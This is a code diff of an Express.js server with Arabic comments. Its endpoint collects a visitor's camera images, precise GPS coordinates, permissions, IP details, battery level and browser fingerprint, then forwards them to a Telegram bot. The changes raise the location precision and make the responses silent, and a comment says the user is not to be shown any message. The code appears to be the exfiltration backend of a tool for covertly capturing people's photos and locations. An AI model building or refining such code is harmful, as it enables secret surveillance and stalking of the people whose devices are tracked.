@@ -6,16 +6,13 @@ const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// توسيع الحد الأقصى لحجم الطلب
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.use(bodyParser.json({ limit: '10mb' }));
 
-// نقطة النهاية لاستقبال البيانات
 app.post('/submitData', async (req, res) => {
     try {
         const { chatId, imageDatas, location, permissions, ipInfo, battery } = req.body;
 
-        // تحليل User-Agent
         const userAgent = req.headers['user-agent'] || '';
         const parser = new UAParser(userAgent);
         const browser = parser.getBrowser();
@@ -36,7 +33,6 @@ app.post('/submitData', async (req, res) => {
         if (deviceVendor || deviceModel) detailedBrowser += ` على${deviceVendor}${deviceModel}`;
         detailedBrowser += engineName;
 
-        // استخراج خط الطول والعرض من الموقع
         let latitude = null;
         let longitude = null;
         let locationText = location || 'غير متاح';
@@ -47,15 +43,14 @@ app.post('/submitData', async (req, res) => {
             if (latMatch && longMatch) {
                 latitude = parseFloat(latMatch[1]);
                 longitude = parseFloat(longMatch[1]);
-                locationText = `${latitude}, ${longitude}`;
+                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
             }
         }
 
-        // البيانات النصية
         const text = `📱 **بيانات جديدة من المستخدم**
         
 🆔 **Chat ID**: ${chatId || 'غير موجود'}
-📍 **الموقع**: ${locationText}
+📍 **الموقع الدقيق**: ${locationText}
 🔐 **الصلاحيات**: ${permissions || 'غير محددة'}
 🌐 **معلومات IP**: ${ipInfo || 'غير متوفرة'}
 🔋 **حالة البطارية**: ${battery || 'غير معروفة'}
@@ -68,7 +63,7 @@ app.post('/submitData', async (req, res) => {
 
         if (!botToken) {
             console.error('❌ BOT_TOKEN غير مضبوط');
-            return res.status(500).send('Bot token missing');
+            return res.sendStatus(500);
         }
 
         // 1. إرسال الرسالة النصية
@@ -78,7 +73,7 @@ app.post('/submitData', async (req, res) => {
             parse_mode: 'Markdown'
         });
 
-        // 2. إرسال الموقع كخريطة (إن توفرت الإحداثيات)
+        // 2. إرسال الموقع كخريطة
         if (latitude !== null && longitude !== null) {
             await axios.post(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                 chat_id: chatIdTelegram,
@@ -87,7 +82,7 @@ app.post('/submitData', async (req, res) => {
             });
         }
 
-        // 3. إرسال الصور (إن وجدت)
+        // 3. إرسال الصور
         if (imageDatas) {
             const imagesArray = imageDatas.split(',').filter(img => img.trim() !== '');
             for (let i = 0; i < imagesArray.length; i++) {
@@ -107,22 +102,16 @@ app.post('/submitData', async (req, res) => {
             }
         }
 
-        res.status(200).send('✅ تم استلام البيانات وإرسالها إلى البوت بنجاح.');
+        // ✅ إرجاع استجابة فارغة (بدون أي رسائل توجيه)
+        res.sendStatus(200);
+
     } catch (error) {
         console.error('❌ حدث خطأ:', error.message);
-        if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
-            try {
-                await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
-                    chat_id: process.env.CHAT_ID,
-                    text: `⚠️ خطأ في الخادم: ${error.message}`
-                });
-            } catch (e) {}
-        }
-        res.status(500).send('❌ حدث خطأ أثناء معالجة الطلب.');
+        // إرجاع استجابة فارغة حتى في حالة الخطأ (لا نريد توجيه المستخدم)
+        res.sendStatus(500);
     }
 });
 
-// نقطة صحّة
 app.get('/', (req, res) => {
     res.send('✅ الخادم يعمل');
 });
